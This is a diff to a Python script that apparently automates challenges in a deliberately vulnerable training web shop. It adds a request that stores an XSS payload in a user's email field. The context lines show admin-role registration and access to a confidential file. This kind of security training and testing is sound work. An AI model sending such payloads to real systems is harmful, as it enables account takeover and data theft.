@@ -7,6 +7,8 @@ import requests
 requests.post(url+'/api/Users',data={'email':'admin','password':'admin','role':'admin'})
 # ---- Admin Section (Access the administration section of the store.)
 requests.get(url+'/assets/public/images/padding/19px.png')
+# ---- Client-side XSS Protection (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a client-side security mechanism.)
+requests.post(url+'/api/Users',data={'email':'<iframe src="javascript:alert(`xss`)">','password':'xss'})
 # ---- Confidential Document (Access a confidential document.)
 requests.get(url+'/ftp/acquisitions.md')
 # ---- Database Schema (Exfiltrate the entire DB schema definition via SQL Injection.)
